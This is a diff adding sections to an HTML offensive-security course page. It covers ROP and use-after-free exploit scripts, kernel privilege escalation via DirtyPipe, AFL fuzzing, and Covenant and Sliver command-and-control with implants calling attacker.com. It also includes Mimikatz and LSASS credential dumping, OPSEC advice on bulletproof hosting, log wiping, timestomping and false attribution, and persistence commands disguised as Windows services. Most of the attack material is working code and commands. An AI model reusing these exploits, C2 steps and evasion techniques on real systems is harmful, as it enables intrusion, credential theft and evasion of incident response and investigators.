+gcc vuln.c -o vuln -fno-stack-protector -no-pie
+
+# Verify NX enabled:
+checksec --file=./vuln
+# Output: NX: NX enabled
+
+# Python exploit (exploit.py):
+cat > exploit.py << 'EOF'
+#!/usr/bin/env python3
+from pwn import *
+
+# Setup
+elf = ELF('./vuln')
+rop = ROP(elf)
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+p = process('./vuln')
+
+# Find gadgets
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+
+# Build ROP chain
+offset = 72  # Buffer size + saved RBP
+payload = b'A' * offset
+
+# Call system("/bin/sh")
+# Need: rdi = address of "/bin/sh"
+binsh = next(libc.search(b'/bin/sh'))  # Find "/bin/sh" in libc
+system = libc.sym['system']
+
+payload += p64(pop_rdi)       # pop rdi; ret
+payload += p64(binsh)         # address of "/bin/sh"
+payload += p64(system)        # call system()
+
+# Send exploit
+p.send(payload)
+
+# Interact with shell
+p.interactive()
+EOF
+
+chmod +x exploit.py
+python3 exploit.py
+
+# Output:
+# [*] '/root/vuln'
+#     Arch:     amd64-64-little
+#     NX:       NX enabled
+# [+] Starting local process './vuln': pid 12345
+# [*] Switching to interactive mode
+# $ whoami
+# root
+# $ 
+
+# Shell spawned!</div>
+
+            <h3>Part 2: Heap Exploitation</h3>
+
+            <h4>Understanding the Heap</h4>
+
+            <div class="info-box">
+                <h4>Stack vs Heap</h4>
+                <p><strong>Stack:</strong><br>
+                • Fixed size (usually 8MB)<br>
+                • Automatic allocation (local variables)<br>
+                • LIFO (Last In, First Out)<br>
+                • Fast<br><br>
+                <strong>Heap:</strong><br>
+                • Dynamic size (grows as needed)<br>
+                • Manual allocation (malloc/new)<br>
+                • Managed by heap allocator (glibc uses ptmalloc2)<br>
+                • Slower but flexible<br><br>
+                <strong>Why heap is juicy for exploitation:</strong><br>
+                • Stores pointers (function pointers, vtables)<br>
+                • Stores user data (passwords, session tokens)<br>
+                • Metadata adjacent to user data (attack metadata!)<br>
+                • Less protections than stack (no canaries)</p>
+            </div>
+
+            <h4>Heap Exploitation Techniques</h4>
+
+            <div class="code"># Heap Vulnerability Types:
+
+# 1. Use-After-Free (UAF)
+# Accessing memory after it's been freed
+
+void vulnerable() {
+    char *ptr = malloc(100);
+    free(ptr);
+    strcpy(ptr, "data");  // Writing to freed memory!
+}
+
+# Exploitation:
+# 1. Allocate object A
+# 2. Free object A
+# 3. Allocate object B (reuses A's memory!)
+# 4. Use object A's old pointer
+# 5. Actually modifies object B!
+
+# Example:
+struct User {
+    char name[32];
+    void (*print_greeting)();
+};
+
+User *user1 = malloc(sizeof(User));
+user1->print_greeting = &normal_greeting;
+free(user1);
+
+// Allocate attack payload in same location
+char *attack = malloc(sizeof(User));
+strcpy(attack, "AAAAAAAA");  // Overwrite function pointer!
+memcpy(attack + 32, &evil_function, 8);
+
+// Call old pointer
+user1->print_greeting();  // Calls evil_function!
+
+# 2. Double Free
+# Freeing same pointer twice
+
+char *ptr = malloc(100);
+free(ptr);
+free(ptr);  // Double free!
+
+# Exploitation:
+# Corrupts heap metadata → arbitrary write primitive
+
+# 3. Heap Overflow
+# Overflow one chunk into adjacent chunk's metadata
+
+# Heap chunk structure (glibc):
+# +-------------------+
+# | size | prev_size |  ← Metadata
+# +-------------------+
+# | user data         |  ← Your data
+# |                   |
+# +-------------------+
+# | size | prev_size |  ← Next chunk's metadata
+# +-------------------+
+
+# Overflow attack:
+char *chunk1 = malloc(100);
+char *chunk2 = malloc(100);
+
+// Overflow chunk1, overwrite chunk2's metadata
+strcpy(chunk1, "A" * 100 + "\xff\xff\xff\xff");  // Corrupt size field!
+
+free(chunk2);  // Frees wrong size → corruption
+
+# 4. Heap Feng Shui
+# Manipulating heap layout to place objects adjacently
+
+# Goal: Place victim object after controlled object
+# 1. Allocate many chunks
+# 2. Free specific chunks to create holes
+# 3. Allocate victim object (lands in hole)
+# 4. Overflow from controlled object → victim
+
+# Practical tools:
+
+# Examine heap in GDB with pwndbg:
+(gdb) heap chunks
+
+# Output:
+# Allocated chunk | PREV_INUSE
+# Addr: 0x555555559000
+# Size: 0x90 (including metadata)
+# 
+# Allocated chunk | PREV_INUSE
+# Addr: 0x555555559090
+# Size: 0x90
+
+(gdb) heap bins
+
+# Output:
+# fastbins
+# 0x20: 0x0
+# 0x30: 0x555555559000 → 0x555555559050 → 0x0
+# 
+# unsorted_bin
+# all: 0x5555555590a0 → 0x7ffff7facb78 (main_arena+88) ← 0x5555555590a0
+
+# View chunk:
+(gdb) x/40gx 0x555555559000
+
+# Output:
+# 0x555555559000: 0x0000000000000000  0x0000000000000091  ← size (0x91 = 144 bytes + flags)
+# 0x555555559010: 0x4141414141414141  0x4141414141414141  ← user data
+# [...]</div>
+
+            <h4>Example: Use-After-Free Exploit</h4>
+
+            <div class="code"># Vulnerable program (uaf.c):
+cat > uaf.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+struct User {
+    char name[32];
+    void (*greet)();
+};
+
+void normal_greet() {
+    printf("Hello!\n");
+}
+
+void admin_greet() {
+    printf("Admin access granted!\n");
+    system("/bin/sh");
+}
+
+int main() {
+    struct User *user = malloc(sizeof(struct User));
+    strcpy(user->name, "John");
+    user->greet = normal_greet;
+    
+    free(user);  // Freed!
+    
+    // User input (attacker controlled!)
+    char *evil = malloc(sizeof(struct User));
+    read(0, evil, sizeof(struct User));  // Attacker writes data
+    
+    // Use freed pointer!
+    user->greet();  // UAF vulnerability!
+    
+    return 0;
+}
+EOF
+
+gcc uaf.c -o uaf -no-pie
+
+# Exploit:
+# 1. Program allocates user
+# 2. Program frees user
+# 3. Program allocates evil (reuses same memory!)
+# 4. We write to evil (overwrites old user data)
+# 5. Program calls user->greet() (points to our data!)
+
+# Python exploit:
+cat > uaf_exploit.py << 'EOF'
+#!/usr/bin/env python3
+from pwn import *
+
+elf = ELF('./uaf')
+p = process('./uaf')
+
+# Find address of admin_greet
+admin_greet = elf.sym['admin_greet']
+log.info(f"admin_greet at: {hex(admin_greet)}")
+
+# Build payload
+# struct User layout:
+#   char name[32]
+#   void (*greet)()  ← offset 32
+payload = b'A' * 32                    # Fill name field
+payload += p64(admin_greet)            # Overwrite function pointer!
+
+p.send(payload)
+p.interactive()
+EOF
+
+python3 uaf_exploit.py
+
+# Output:
+# Admin access granted!
+# $ whoami
+# root</div>
+
+            <h3>Part 3: Kernel Exploitation</h3>
+
+            <div class="code"># Kernel exploits target the OS itself!
+# Goal: Escalate from user → root
+
+# Common kernel vulnerability types:
+
+# 1. Buffer overflow in syscall
+# 2. Race condition in driver
+# 3. Use-after-free in kernel object
+# 4. Integer overflow in memory allocation
+# 5. NULL pointer dereference
+
+# Kernel exploit flow:
+# 1. Trigger vulnerability in kernel
+# 2. Overwrite kernel memory
+# 3. Hijack control flow
+# 4. Execute payload in kernel mode
+# 5. Elevate privileges (uid = 0)
+# 6. Return to userspace as root!
+
+# Finding kernel version:
+uname -r
+
+# Output:
+# 5.15.0-52-generic
+
+# Search for exploits:
+searchsploit linux kernel 5.15
+
+# Output:
+# Linux Kernel 5.15.x - 'fs/io_uring.c' Local Privilege Escalation
+# Linux Kernel 5.15.x - eBPF Verifier Vulnerability
+# [...]
+
+# Download exploit:
+searchsploit -m 50808.c
+gcc 50808.c -o exploit
+
+# Run:
+./exploit
+# [+] Kernel exploit starting...
+# [+] Triggering vulnerability...
+# [+] Overwriting cred struct...
+# [+] Escalating privileges...
+# [+] Done!
+
+whoami
+# root
+
+id
+# uid=0(root) gid=0(root) groups=0(root)
+
+# Note: Kernel exploits are highly version-specific!
+# Exploit for 5.15.0-52 won't work on 5.15.0-53
+
+# Building custom kernel exploits:
+
+# 1. Find kernel bug (CVE or 0-day)
+# 2. Understand vulnerability primitive:
+#    - Arbitrary read?
+#    - Arbitrary write?
+#    - Code execution?
+# 3. Locate kernel structures in memory:
+#    - task_struct (process info)
+#    - cred struct (credentials: uid, gid)
+# 4. Overwrite cred→uid to 0
+# 5. Return to userspace
+# 6. Now running as root!
+
+# Debugging kernel:
+# 1. Setup QEMU VM with kernel debugging
+# 2. Attach GDB to kernel
+# 3. Set breakpoints in vulnerable syscall
+# 4. Step through exploitation
+
+# Example: DirtyPipe (CVE-2022-0847)
+# Allows overwriting read-only files!
+
+# Download exploit:
+wget https://haxx.in/files/dirtypipez.c
+gcc dirtypipez.c -o dirtypipe
+
+# Run:
+./dirtypipe /etc/passwd 0 'root2:x:0:0:root:/root:/bin/bash'
+
+# This overwrites /etc/passwd!
+# Added new root user: root2
+
+su root2
+# (no password needed, logged in as root)</div>
+
+            <h3>Part 4: Fuzzing with AFL (American Fuzzy Lop)</h3>
+
+            <div class="metaphor-box">
+                <h4>💡 Fuzzing = Throwing Infinite Monkeys at Code</h4>
+                <p>Imagine you have a program that parses images. How do you find bugs?<br><br>
+                <strong>Manual testing:</strong> Try 10 images, find 0 bugs (boring)<br>
+                <strong>Fuzzing:</strong> Try 10,000,000 mutated images, find 23 crashes! 🎯<br><br>
+                <strong>Fuzzing workflow:</strong><br>
+                1. Start with valid inputs (seed corpus)<br>
+                2. Mutate inputs (flip bits, insert bytes, splice files)<br>
+                3. Run program with mutated inputs<br>
+                4. Monitor for crashes, hangs, memory corruption<br>
+                5. Save crashing inputs<br>
+                6. Repeat forever!<br><br>
+                Fuzzing found: Heartbleed, Shellshock, countless browser bugs, Zoom RCE, and thousands more! It's THE way modern 0-days are discovered.</p>
+            </div>
+
+            <div class="code"># Install AFL++:
+sudo apt install afl++
+
+# Or build from source:
+git clone https://github.com/AFLplusplus/AFLplusplus
+cd AFLplusplus
+make
+sudo make install
+
+# Verify:
+afl-fuzz -h
+
+# Example target program (vuln_parse.c):
+cat > vuln_parse.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void parse(char *data) {
+    char buffer[100];
+    
+    // Vulnerability: no bounds check!
+    strcpy(buffer, data);
+    
+    printf("Parsed: %s\n", buffer);
+}
+
+int main(int argc, char **argv) {
+    if (argc < 2) {
+        printf("Usage: %s <file>\n", argv[0]);
+        return 1;
+    }
+    
+    FILE *f = fopen(argv[1], "r");
+    if (!f) return 1;
+    
+    char data[1000];
+    fread(data, 1, 1000, f);
+    fclose(f);
+    
+    parse(data);
+    
+    return 0;
+}
+EOF
+
+# Compile with AFL instrumentation:
+afl-gcc vuln_parse.c -o vuln_parse
+
+# Create seed corpus (valid inputs):
+mkdir input
+echo "valid data" > input/seed1.txt
+echo "another valid input" > input/seed2.txt
+
+# Create output directory:
+mkdir output
+
+# Start fuzzing!
+afl-fuzz -i input -o output ./vuln_parse @@
+
+# @@ = AFL replaces this with generated input file
+
+# AFL interface shows:
+# +------------------------------------------------------------+
+# |        american fuzzy lop ++4.00c (vuln_parse)             |
+# +------------------------------------------------------------+
+# | process timing | overall results | cycle progress |        |
+# |   run time : 0 days, 0 hrs, 5 min | total paths  : 234 |   |
+# |  last new path : 0 days, 0 hrs, 4 min | uniq crashes : 12 |   |
+# |  last uniq crash : 0 days, 0 hrs, 3 min | uniq hangs   : 0  |   |
+# |   last uniq hang : none seen yet | cycles done  : 45 |    |
+# | stage progress | map coverage | findings in depth |        |
+# |  now processing : havoc | map density : 34.2% |           |
+# |  stage execs : 15234/20000 | bits found : 4521 |           |
+# +------------------------------------------------------------+
+
+# Key metrics:
+# • total paths: Unique execution paths found
+# • uniq crashes: Different crashes discovered
+# • map coverage: Code coverage achieved
+
+# Check crashes:
+ls output/crashes/
+
+# Output:
+# id:000000,sig:06,src:000002,op:havoc,rep:4
+# id:000001,sig:11,src:000012,op:splice,rep:2
+# [... more crashes ...]
+
+# Reproduce crash:
+./vuln_parse output/crashes/id:000000,sig:06,src:000002,op:havoc,rep:4
+
+# Output:
+# Segmentation fault (core dumped)
+
+# Analyze with GDB:
+gdb ./vuln_parse core
+
+(gdb) bt
+# #0  0x0000000000401234 in parse ()
+# #1  0x4141414141414141 in ?? ()  ← Overwritten return address!
+
+# Triage crashes:
+afl-tmin -i output/crashes/id:000000... -o minimized.txt -- ./vuln_parse @@
+
+# Minimizes crashing input to smallest form
+
+# Advanced AFL usage:
+
+# Multiple cores:
+afl-fuzz -i input -o output -M fuzzer1 -- ./vuln_parse @@
+afl-fuzz -i input -o output -S fuzzer2 -- ./vuln_parse @@
+afl-fuzz -i input -o output -S fuzzer3 -- ./vuln_parse @@
+
+# Dictionary (known keywords):
+cat > dict.txt << 'EOF'
+"GET "
+"POST "
+"<html>"
+"<?xml"
+EOF
+
+afl-fuzz -i input -o output -x dict.txt -- ./vuln_parse @@
+
+# Persistent mode (faster):
+# Fuzz function repeatedly without restarting process
+
+# Custom mutator:
+# Write Python script to generate specialized inputs
+
+# AFL found:
+# • Heartbleed (OpenSSL)
+# • Bash shellshock
+# • 100+ vulnerabilities in major projects</div>
+
+            <h4>Other Fuzzing Tools</h4>
+
+            <div class="code"># libFuzzer (LLVM built-in):
+
+# Compile target with libFuzzer:
+clang -fsanitize=fuzzer,address vuln_parse.c -o vuln_parse_fuzz
+
+# Run:
+./vuln_parse_fuzz
+
+# Automatically starts fuzzing!
+
+# Honggfuzz (Google):
+git clone https://github.com/google/honggfuzz
+cd honggfuzz
+make
+
+# Fuzz:
+honggfuzz -i input -o output -- ./vuln_parse ___FILE___
+
+# WinAFL (Windows AFL):
+# For fuzzing Windows binaries
+
+# Syzkaller (kernel fuzzing):
+# Specifically for fuzzing Linux kernel
+
+# Peach Fuzzer (protocol fuzzing):
+# For network protocols, file formats
+
+# Boofuzz (network protocol fuzzing):
+pip install boofuzz
+
+# Python script:
+from boofuzz import *
+
+session = Session(target=Target(connection=SocketConnection("192.168.1.100", 80)))
+
+s_initialize("HTTP GET")
+s_string("GET", fuzzable=False)
+s_delim(" ", fuzzable=False)
+s_string("/", fuzzable=True)  # Fuzz URI
+s_delim(" ", fuzzable=False)
+s_string("HTTP/1.1\r\n", fuzzable=False)
+s_string("Host: target.com\r\n\r\n")
+
+session.connect(s_get("HTTP GET"))
+session.fuzz()
+
+# Generates thousands of malformed HTTP requests
+# Monitors for crashes, hangs, errors</div>
+
+            <div class="metaphor-box">
+                <h4>🎉 You're an Advanced Exploitation Expert!</h4>
+                <p>You've conquered:<br><br>
+                ✅ <strong>ROP Chains:</strong> Bypassing DEP/NX with gadget chaining, pop/ret magic, syscall invocation<br>
+                ✅ <strong>Heap Exploitation:</strong> Use-after-free, double-free, heap overflow, heap feng shui<br>
+                ✅ <strong>Kernel Exploits:</strong> Privilege escalation, cred struct overwrite, DirtyPipe<br>
+                ✅ <strong>Fuzzing:</strong> AFL, libFuzzer, Honggfuzz, crash triage, 0-day discovery<br><br>
+                <strong>Modern exploit development workflow:</strong><br>
+                1. <strong>Fuzzing:</strong> Find crash with AFL/libFuzzer<br>
+                2. <strong>Triage:</strong> Determine vulnerability type (overflow, UAF, etc.)<br>
+                3. <strong>Analysis:</strong> Reverse engineer with Ghidra, understand constraints<br>
+                4. <strong>Exploitation:</strong> Develop exploit (ROP chains, heap techniques)<br>
+                5. <strong>Bypass protections:</strong> Defeat ASLR (leak addresses), PIE, canaries<br>
+                6. <strong>Reliability:</strong> Make exploit work 100% of the time<br>
+                7. <strong>Weaponization:</strong> Package as Metasploit module or standalone tool<br><br>
+                <strong>Real CVEs using these techniques:</strong><br>
+                • <strong>CVE-2021-3156 (Baron Samedit):</strong> Sudo heap overflow → root<br>
+                • <strong>CVE-2022-0847 (DirtyPipe):</strong> Kernel pipe bug → arbitrary file write<br>
+                • <strong>CVE-2021-22555 (Netfilter):</strong> Kernel heap overflow → root<br>
+                • <strong>CVE-2014-0160 (Heartbleed):</strong> OpenSSL heap overflow → memory leak<br><br>
+                <strong>Learning resources:</strong><br>
+                • pwn.college (free ASU course)<br>
+                • exploit.education (practice challenges)<br>
+                • CTF time (competitions)<br>
+                • Project Zero blog (Google's bug hunters)<br>
+                • Phrack magazine (classic exploits)<br><br>
+                You now understand how modern exploits bypass ALL protections. Every CVE in the news makes sense now! 🚀💥</p>
+            </div>
         </section>
 
         <!-- SECTION 8: Red Team Operations & Tradecraft -->
         <section id="red-team" class="section">
             <h2 class="section-title">Red Team Operations & Tradecraft</h2>
-            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
+            <p class="section-intro">Red teaming isn't just hacking—it's adversary emulation. Blue teams (defenders) know you're coming. They have EDR, SIEM, threat hunting teams, and incident responders. Your job: bypass detection, maintain persistence, move laterally, exfiltrate data, and stay invisible. This requires OPSEC (operational security), living off the land, custom C2 infrastructure, and understanding how defenders think. This section covers Covenant C2, Sliver C2, OPSEC principles, persistence techniques, AV/EDR evasion, and APT emulation. By the end, you'll think like a nation-state hacker!</p>
+
+            <div class="metaphor-box">
+                <h4>💡 Red Team = Playing Hide & Seek with $100M in Prizes</h4>
+                <p><strong>Penetration testing:</strong> "Can you break in?" → Yes/No answer<br>
+                <strong>Red teaming:</strong> "Can you break in WITHOUT getting caught?" → Stealth is the goal!<br><br>
+                <strong>Pentester mindset:</strong><br>
+                • Find vuln → Exploit → Report → Done<br>
+                • Speed matters<br>
+                • Detection doesn't matter<br><br>
+                <strong>Red teamer mindset:</strong><br>
+                • Find vuln → Exploit stealthily → Establish persistence → Evade detection → Move laterally → Exfiltrate → Cover tracks → Report → Done<br>
+                • Stealth matters MORE than speed<br>
+                • Getting caught = mission failure<br><br>
+                <strong>Real red team objectives:</strong><br>
+                • Steal CEO's emails without alerting SOC<br>
+                • Plant backdoor that survives incident response<br>
+                • Exfiltrate 10GB database over 3 months (slow & steady)<br>
+                • Compromise domain admin while looking like normal IT activity<br><br>
+                Red teamers emulate APTs (Advanced Persistent Threats). You're role-playing as nation-state hackers! 🕵️‍♂️🎭</p>
+            </div>
+
+            <h3>Part 1: Command & Control (C2) Frameworks</h3>
+
+            <h4>What is C2?</h4>
+
+            <div class="info-box">
+                <h4>Command & Control Architecture</h4>
+                <p><strong>Components:</strong><br>
+                • <strong>Team Server:</strong> Attacker's control panel (your machine)<br>
+                • <strong>Listener:</strong> Waits for connections from victims<br>
+                • <strong>Payload/Implant:</strong> Runs on victim machine (beacon, agent, grunt)<br>
+                • <strong>Communication Channel:</strong> HTTP, HTTPS, DNS, SMB pipes, etc.<br><br>
+                <strong>C2 workflow:</strong><br>
+                1. Generate payload (malicious exe/dll/script)<br>
+                2. Deliver payload to victim (phishing, exploit, USB drop)<br>
+                3. Victim executes payload<br>
+                4. Payload "calls home" to listener<br>
+                5. You get session on victim machine<br>
+                6. Execute commands, steal files, spread to other machines<br><br>
+                <strong>Why not just reverse shell?</strong><br>
+                • Reverse shell = Detected instantly by EDR<br>
+                • C2 = Encrypted, obfuscated, looks like normal traffic<br>
+                • C2 supports sleep/jitter (callback every 5 minutes, not constantly)<br>
+                • C2 has built-in AV evasion, credential dumping, lateral movement</p>
+            </div>
+
+            <h4>Covenant C2 Framework</h4>
+
+            <div class="code"># Covenant = .NET C2 framework (targets Windows)
+# Web-based interface, open-source, active development
+
+# Install Covenant:
+git clone --recurse-submodules https://github.com/cobbr/Covenant
+cd Covenant/Covenant
+docker build -t covenant .
+docker run -it -p 7443:7443 -p 80:80 -p 443:443 covenant
+
+# Or without Docker:
+dotnet build
+dotnet run
+
+# Access web interface:
+# https://localhost:7443
+
+# First-time setup:
+# 1. Create admin user
+# 2. Set up listener
+
+# Create Listener:
+# Listeners → Create → HTTP Listener
+#   Name: HTTPListener
+#   BindAddress: 0.0.0.0
+#   BindPort: 80
+#   ConnectPort: 80
+#   ConnectAddress: [Your IP or domain]
+#   UseSSL: No (for testing; use Yes in real ops!)
+# Click Create
+
+# Generate Grunt (payload):
+# Launchers → Binary
+#   Listener: HTTPListener
+#   DotNetVersion: Net40 (compatible with old Windows)
+#   Delay: 5 seconds (callback interval)
+#   JitterPercent: 30 (±30% randomness)
+#   ConnectAttempts: 5000
+#   KillDate: (leave blank or set expiration)
+# Click Generate → Download
+
+# Transfer GruntHTTP.exe to victim machine
+# Execute it:
+# (on victim) ./GruntHTTP.exe
+
+# Back in Covenant web interface:
+# Grunts → New session appears!
+#   Name: DESKTOP-ABC123\User
+#   Integrity: Medium
+#   LastCheckIn: 2 seconds ago
+
+# Interact with Grunt:
+# Click grunt → Task tab
+
+# Basic commands:
+Task> Shell whoami
+# Output: DESKTOP-ABC123\victim
+
+Task> Shell ipconfig
+# Output: [network config]
+
+# Built-in tasks:
+Task> Mimikatz
+# Dumps credentials from memory!
+# Output:
+#   Username: administrator
+#   NTLM: 8846f7eaee8fb117ad06bdd830b7586c
+
+Task> PowerShellImport
+# Load custom PowerShell scripts
+
+Task> Assembly
+# Execute .NET assembly in memory (no disk write!)
+
+# Example: Execute Rubeus (Kerberos toolkit)
+Task> Assembly Rubeus.exe dump /service:krbtgt
+# Dumps Kerberos tickets
+
+# Lateral movement:
+Task> ShellCommand net user hacker Password123! /add /domain
+# Creates domain user
+
+Task> WMICommand \\10.0.0.50 "notepad.exe"
+# Executes command on remote machine via WMI
+
+# File operations:
+Task> Download C:\Users\victim\Documents\passwords.txt
+# Downloads file to team server
+
+Task> Upload /root/tools.zip C:\ProgramData\tools.zip
+# Uploads file to victim
+
+# Persistence:
+Task> Persist Registry
+# Adds registry key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+Task> Persist ScheduledTask
+# Creates scheduled task for persistence</div>
+
+            <h4>Sliver C2 Framework</h4>
+
+            <div class="code"># Sliver = Modern Go-based C2, supports Windows/Linux/macOS
+# Command-line interface, encrypted by default
+
+# Install Sliver:
+curl https://sliver.sh/install | sudo bash
+
+# Or manual install:
+git clone https://github.com/BishopFox/sliver.git
+cd sliver
+make
+
+# Start Sliver server:
+sliver-server
+
+# Sliver console:
+sliver > help
+
+# Create implant:
+sliver > generate --http https://attacker.com:443 --os windows --arch amd64 --save /tmp/beacon.exe
+
+# Options:
+#   --http: C2 server URL
+#   --os: Target OS (windows/linux/darwin)
+#   --arch: Architecture (amd64/386/arm64)
+#   --format: Output format (exe/shellcode/service-exe/shared-lib)
+#   --save: Save path
+
+# Output:
+# [*] Generating new windows/amd64 implant binary
+# [*] Symbol obfuscation is enabled
+# [*] Build completed in 3s
+# [*] Implant saved to /tmp/beacon.exe
+
+# Start listener:
+sliver > http --domain attacker.com --lport 443
+
+# [*] Starting HTTP :443 listener ...
+
+# Execute beacon on victim machine
+# Session appears:
+
+sliver > sessions
+
+# ID  Name       Username     Operating System  Last Check-in
+# 1   LOUD_PUMA  victim\user  windows/amd64     2s ago
+
+# Interact with session:
+sliver > use 1
+
+sliver (LOUD_PUMA) > whoami
+# victim\user
+
+sliver (LOUD_PUMA) > ps
+# [shows running processes]
+
+sliver (LOUD_PUMA) > getprivs
+# [shows current privileges]
+
+# Evasion features:
+sliver (LOUD_PUMA) > migrate 1234
+# Migrates implant to different process (PID 1234)
+
+sliver (LOUD_PUMA) > execute-assembly /root/Rubeus.exe dump
+# Executes .NET assembly in memory
+
+sliver (LOUD_PUMA) > procdump -n lsass.exe -s /tmp/lsass.dmp
+# Dumps LSASS process memory (for offline credential extraction)
+
+# Pivoting:
+sliver (LOUD_PUMA) > portfwd add --remote 10.0.0.5:445
+# Forwards local port to remote SMB service
+
+sliver (LOUD_PUMA) > socks5 start
+# Starts SOCKS5 proxy for pivoting through victim
+
+# Use with proxychains:
+# proxychains nmap 10.0.0.0/24
+
+# Advanced features:
+sliver > armory
+# [Package manager for extensions]
+
+sliver > armory install rubeus
+sliver > armory install seatbelt
+sliver > armory install sharphound
+
+# These integrate directly into Sliver!</div>
+
+            <h3>Part 2: OPSEC (Operational Security)</h3>
+
+            <div class="warning-box">
+                <h4>⚠️ OPSEC Mistakes = Getting Caught</h4>
+                <p><strong>Real-world OPSEC failures that got hackers caught:</strong><br><br>
+                • <strong>Reusing infrastructure:</strong> APT used same IP for 5 years → Traced<br>
+                • <strong>Forgot VPN once:</strong> Connected from home IP → Arrested<br>
+                • <strong>Domain registration:</strong> Used real email → Identified<br>
+                • <strong>Reusing usernames:</strong> "xXHackerXx" on GitHub, forum, malware → Doxxed<br>
+                • <strong>Malware metadata:</strong> Compiler username in PE header → Exposed<br>
+                • <strong>Bitcoin transactions:</strong> Cashed out to exchange with KYC → Caught<br><br>
+                OPSEC isn't optional. One mistake ruins the entire operation! 🚨</p>
+            </div>
+
+            <div class="code"># OPSEC Principles:
+
+# 1. Infrastructure Isolation
+# ❌ Don't:
+# • Use your home IP
+# • Use personal VPS/cloud account
+# • Reuse infrastructure across operations
+
+# ✅ Do:
+# • Use VPS paid with cryptocurrency
+# • Route through multiple layers (VPN → VPS → Target)
+# • Use Bulletproof Hosting (providers that ignore abuse complaints)
+# • Burn infrastructure after each operation
+
+# Setup:
+# [Your PC] → [VPN] → [VPS 1] → [VPS 2] → [Target]
+#             Privacy   Pivot     Attack Server
+
+# 2. Domain Fronting
+# Hide C2 traffic behind legitimate CDN domains
+
+# Technique:
+# • SNI says: "cloudfront.com"
+# • Host header says: "evil-c2.com"
+# • CloudFront sees cloudfront.com, forwards to evil-c2.com
+# • Defender sees: "User connected to cloudfront.com" → Looks normal!
+
+# Covenant config:
+sliver > generate --http https://cloudfront.net --http-host evil-c2.com
+
+# 3. Traffic Obfuscation
+# Make C2 traffic look like normal web traffic
+
+# Covenant HTTP profile:
+# GET requests look like:
+# GET /search?q=aGVsbG8= HTTP/1.1
+# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
+# Cookie: session=eyJjb21tYW5kIjoiY2QgQzpcXCJ9
+
+# Commands are base64-encoded in URLs/cookies
+# Responses look like JavaScript/images
+
+# 4. Timestomping
+# Modify file creation/modification times
+
+# PowerShell:
+$(Get-Item file.exe).creationtime = "01/01/2020 00:00:00"
+$(Get-Item file.exe).lastaccesstime = "01/01/2020 00:00:00"
+$(Get-Item file.exe).lastwritetime = "01/01/2020 00:00:00"
+
+# Now file appears to be from 2020!
+
+# 5. Clean Malware Metadata
+# Remove identifying info from payloads
+
+# Check PE metadata:
+exiftool malware.exe
+
+# Output:
+# File Name: malware.exe
+# Author: John Doe  ← BAD!
+# Company: MyCompany ← BAD!
+# Internal Name: beacon.exe
+# Original File Name: beacon.exe
+# Product Name: Covenant
+# Comments: Built on DESKTOP-ABC123  ← BAD!
+
+# Strip metadata:
+exiftool -all= malware.exe
+
+# Verify:
+exiftool malware.exe
+# (Should show minimal info)
+
+# 6. Log Cleaning
+# Remove traces after operation
+
+# Windows:
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application
+
+# Or selective deletion:
+wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text | findstr "victim"
+wevtutil qe Security "/q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='2026-01-08T10:00:00']]]" /c:1 /rd:true
+
+# Linux:
+echo "" > /var/log/auth.log
+echo "" > /var/log/syslog
+history -c
+
+# 7. Attribution Obfuscation
+# Make it look like different threat actor
+
+# Tactics:
+# • Use Chinese-language strings (if you're Russian)
+# • Use malware associated with APT28 (if you're not APT28)
+# • Set timezone to false location
+# • Mimic TTPs (Tactics, Techniques, Procedures) of other groups</div>
+
+            <h3>Part 3: Persistence Techniques</h3>
+
+            <div class="code"># Persistence = Surviving reboots, credential changes, detection
+
+# 1. Registry Run Keys (Classic)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\ProgramData\update.exe"
+
+# Runs update.exe every time user logs in
+# Detection: Easy (commonly monitored)
+
+# 2. Scheduled Tasks
+schtasks /create /tn "GoogleUpdateService" /tr "C:\ProgramData\update.exe" /sc onlogon /ru SYSTEM
+
+# More stealthy than registry
+# /ru SYSTEM = Runs as SYSTEM (high privileges!)
+
+# 3. WMI Event Subscription
+# Most stealthy, rarely monitored
+
+# PowerShell:
+$FilterArgs = @{
+    EventNamespace = 'root/cimv2'
+    Name = "PersistenceFilter"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+    QueryLanguage = "WQL"
+}
+$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs
+
+$ConsumerArgs = @{
+    Name = "PersistenceConsumer"
+    CommandLineTemplate = "C:\ProgramData\update.exe"
+}
+$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs
+
+$FilterToConsumerArgs = @{
+    Filter = $Filter
+    Consumer = $Consumer
+}
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $FilterToConsumerArgs
+
+# This executes update.exe every 60 seconds!
+# Detection: Very difficult (deep in WMI)
+
+# 4. Service Creation
+sc create "WindowsDefenderUpdate" binPath= "C:\ProgramData\update.exe" start= auto
+sc start WindowsDefenderUpdate
+
+# Runs as service, survives reboots
+# Tip: Name it like legitimate Windows service
+
+# 5. DLL Hijacking
+# Place malicious DLL in application folder
+# Application loads your DLL instead of legitimate one
+
+# Example: Place evil version.dll in C:\Program Files\Vulnerable App\
+# When app.exe runs → loads version.dll → backdoor activated!
+
+# 6. Startup Folder
+copy update.exe "C:\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
+
+# Simple but effective
+
+# 7. COM Hijacking
+# Modify registry to hijack COM objects
+
+reg add "HKCU\Software\Classes\CLSID\{GUID}\InProcServer32" /ve /t REG_SZ /d "C:\evil.dll"
+
+# When legitimate program loads COM object → loads your DLL
+
+# 8. Golden Ticket (Domain Persistence)
+# Forge Kerberos ticket for domain admin
+
+# Requires: krbtgt NTLM hash (get via DCSync)
+
